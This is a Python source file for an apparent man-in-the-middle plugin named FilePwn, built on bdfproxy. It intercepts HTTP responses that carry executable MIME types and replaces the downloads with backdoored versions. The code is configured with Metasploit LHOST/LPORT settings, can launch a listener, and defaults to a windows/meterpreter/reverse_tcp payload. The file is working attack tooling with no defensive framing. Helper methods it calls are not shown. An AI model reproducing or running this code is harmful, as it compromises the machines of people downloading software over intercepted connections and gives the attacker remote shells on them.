import os,subprocess,logging,time
from bdfproxy.bdf_proxy import *
exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe', 'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']

class FilePwn(Plugin):
    name = "FilePwn"
    optname = "filepwn"
    implements = ["handleResponse"]
    has_opts = True
    log_level = logging.DEBUG
    desc = "Backdoor executables being sent over http using bdfproxy"
    
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.msf_file_payload_opts = "LHOST=%s LPORT=%s" % \
                                      (options.msf_lhost,options.msf_file_lport)
        self.payloads = {}
        self._make_files()
        if options.launch_msf_listener and options.msf_rc == "/tmp/tmp.rc":
            self._start_msf()

    
    def handleResponse(self,request,data):
        #print "http://" + request.client.getRequestHostname() + request.uri
        ch = request.client.headers['Content-Type']
        #print ch
        if ch in self.payloads:
            print "Replaced file of mimtype %s with malicious version" % ch
            data = self.payloads[ch]
            return {'request':request,'data':data}
        else:
            return

    def add_options(self,options):
        options.add_argument("--msf-file-payload",type=str,default="windows/meterpreter/reverse_tcp",
                help="Payload you want to use (default: windows/meterpreter/reverse_tcp)")
